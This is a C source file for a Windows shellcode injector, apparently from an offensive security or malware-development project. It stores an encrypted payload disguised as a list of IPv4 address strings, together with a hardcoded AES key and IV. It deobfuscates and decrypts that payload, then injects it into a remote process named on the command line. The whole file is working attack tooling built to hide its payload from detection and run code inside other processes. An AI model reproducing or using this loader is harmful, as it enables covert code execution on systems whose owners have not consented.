#include "glassBox.h"
#include "getProcess.h"
#include "injectCode.h"
#include "aesDecryption.h"
#include "ipv4Deobfuscation.h"


int wmain(int argc, wchar_t* argv[]) {

	char* ipv4Array[] = {
			"27.205.158.150","165.216.83.36","205.243.29.17","157.173.82.197","46.33.219.248","137.11.91.54","46.245.76.76","76.214.102.108",
			"252.159.83.27","44.88.59.169","114.29.20.21","213.179.53.102","140.129.236.39","163.45.88.238","135.145.3.71","247.122.47.2",
			"197.224.7.21","166.200.239.245","6.157.212.109","23.146.10.192","253.65.3.235","239.78.166.206","133.113.231.209","37.242.249.201",
			"107.134.138.131","13.175.28.185","231.185.34.184","235.101.73.241","44.128.192.175","131.47.226.49","19.118.234.196","118.172.136.195",
			"137.165.160.68","125.237.58.158","197.38.82.232","208.250.114.17","156.192.51.190","124.134.177.22","144.177.48.76","187.215.184.172",
			"249.16.116.99","106.117.18.176","165.230.216.94","182.118.241.134","231.117.147.69","220.133.97.181","188.246.115.201","197.231.131.42",
			"185.74.109.29","186.175.142.17","180.132.25.179","38.154.221.142","219.26.97.244","206.26.154.175","94.84.13.58","32.83.113.89",
			"157.3.247.57","180.143.53.7","53.80.216.35","104.43.121.117","73.216.84.224","22.90.245.136","112.189.140.86","28.125.76.80",
			"59.148.106.90","115.67.195.205","211.106.12.165","251.159.89.244","97.44.195.84","214.233.246.127","30.17.210.118","108.165.213.31"

	};

	unsigned char AESkey[32] = {
			0xC5, 0xF1, 0xD3, 0x23, 0xD3, 0xBB, 0x5C, 0xC0,
			0x48, 0x76, 0x14, 0x1A, 0x33, 0xA9, 0xFA, 0x4A,
			0xAB, 0x9B, 0xA8, 0x02, 0x21, 0x2A, 0x5F, 0x20,
			0x92, 0x87, 0x8E, 0x53, 0xA3, 0x0E, 0xF9, 0xE0
	};

	unsigned char AESIV[16] = {
			0x6D, 0xAB, 0x23, 0x32, 0xED, 0x02, 0x2F, 0xE3,
			0x1A, 0x88, 0xE9, 0x5F, 0xDC, 0xF4, 0xD2, 0xD9
	};



	SIZE_T numElements = sizeof(ipv4Array) / sizeof(ipv4Array[0]);

	PBYTE pDecoded = NULL;
	SIZE_T decodedSize = 0;



	if (argc < 1) {
		warn("Usage : shellcodeInject.exe <Process Name>");
		return EXIT_FAILURE;
	}
	LPWSTR szProcessName = argv[1];

	//info("Injecting DLL: %ls Into Process: %ls", szDllPath, szProcessName);


	DWORD dwProcessId = 0;
	HANDLE hProcess = NULL;

	if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
		warn("Failed to get handle for process : %ls", szProcessName);
		return EXIT_FAILURE;
	}

	info("Deobfuscation Payload ...");
	if (!Ipv4Deobfuscation(ipv4Array, numElements, 288, &pDecoded, &decodedSize)) {
		warn("Ipv4Deobfuscation Failed With Error : %d \n", GetLastError());
		return EXIT_FAILURE;
	}

	info("Decrypting Payload ...");
	if (!AesDecryptBuffer(pDecoded, decodedSize, AESkey, AESIV)) {
		warn("AesDecryptBuffer Failed With Error : %d \n", GetLastError());
		HeapFree(GetProcessHeap(), 0, pDecoded);
		return EXIT_FAILURE;
	}

	if (!InjectShellcodeToRemoteProcess(hProcess, pDecoded, decodedSize)) {
		warn("Failed to Inject Process with Error : %d", GetLastError());
		return EXIT_FAILURE;
	}

	in("Press <Enter> to Exit...");
	getchar();

	return EXIT_SUCCESS;
}